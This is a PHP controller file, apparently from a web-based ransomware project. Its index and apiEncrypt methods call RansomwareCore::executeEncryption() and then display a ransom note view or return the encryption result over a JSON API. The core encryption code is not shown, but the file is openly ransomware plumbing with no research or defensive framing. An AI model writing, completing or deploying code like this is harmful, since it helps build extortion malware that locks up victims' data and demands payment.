<?php
namespace App\Controllers;

use App\Models\RansomwareCore;
use App\Core\Logger;

class EncryptionController {
    public function index() {
        try {
            $core = new RansomwareCore();
            $result = $core->executeEncryption();
            
            // Display ransom note
            $this->displayRansomNote();
            
            return $result;
            
        } catch (\Exception $e) {
            Logger::error("Encryption controller error", ['error' => $e->getMessage()]);
            http_response_code(500);
            return ['success' => false, 'error' => $e->getMessage()];
        }
    }
    
    public function apiEncrypt() {
        header('Content-Type: application/json');
        
        try {
            $core = new RansomwareCore();
            $result = $core->executeEncryption();
            
            echo json_encode($result);
            
        } catch (\Exception $e) {
            http_response_code(500);
            echo json_encode(['success' => false, 'error' => $e->getMessage()]);
        }
    }
    
    private function displayRansomNote() {
        $config = \App\Core\ConfigManager::load('encryption');
        include __DIR__ . '/../Views/ransom_note.php';
        exit;
    }
}